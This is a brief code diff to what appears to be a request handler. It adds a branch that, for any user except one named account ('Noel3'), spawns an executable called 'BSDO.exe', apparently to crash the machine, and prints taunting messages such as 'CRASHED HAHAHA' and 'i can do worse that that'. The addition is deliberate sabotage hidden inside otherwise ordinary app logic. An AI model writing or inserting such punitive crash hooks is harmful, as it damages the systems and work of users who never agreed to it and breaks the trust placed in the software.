@@ -111,6 +111,14 @@ if (req.body.order == "UnspawnYON")
 {
   also("UnspawnYON");
 }
+if (req.body.order == "winCrash" && userInf != "Noel3" || req.body.order == "Wincrash" && userInf != "Noel3")
+{
+  spawn('BSDO.exe');
+  print("CRASHED HAHAHA >:3");
+  print("don't cheat lmao.");
+  print("i can do worse that that.");
+  //He is always watching.
+}
 });
 
 
